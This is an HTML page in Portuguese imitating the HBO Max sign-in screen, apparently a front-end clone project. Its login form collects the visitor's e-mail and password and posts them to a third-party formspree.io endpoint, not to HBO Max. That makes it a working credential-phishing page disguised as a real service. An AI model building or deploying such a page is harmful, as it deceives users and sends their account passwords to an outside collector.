<!DOCTYPE html>
<html lang="pt-br">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HBOMax_02</title>
    <link rel="stylesheet" href="./styles/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Alegreya+Sans&family=Bitter:wght@500&family=Climate+Crisis&family=Inter&family=Permanent+Marker&display=swap" rel="stylesheet">
  </head>
  <body>
    <section class="boxAllContent">
      <header>
        <img src="./images/hb0max_logo.svg" alt="Hbo Max Logo">
        <h3>Menu</h3>
        <h3>Assinar</h3>
        <h1>Entrar</h1>
      </header>
      <h3>Você tem uma conta HBO Max</h3>
      <form action="https://formspree.io/f/meqwldlb" method="post">
        <label for="">E-mail</label>
        <input type="email" name="email" required autocomplete="off" placeholder="Digite seu e-mail..">

        <label for="senha">Senha</label>
        <input type="password" name="senha" required autocomplete="off" placeholder="Digite seu e-mail..">
        
        <button class="buttonEntrar">Entrar</button>
      </form>
    
      <h3>Você acessa a HBO Max por um provedor
        <br>
        de TV, de internet ou celular?
      </h3>
      <button class="buttonEntrarProvedor">Entrar com provedor</button>
    </section>
  </body>
</html>
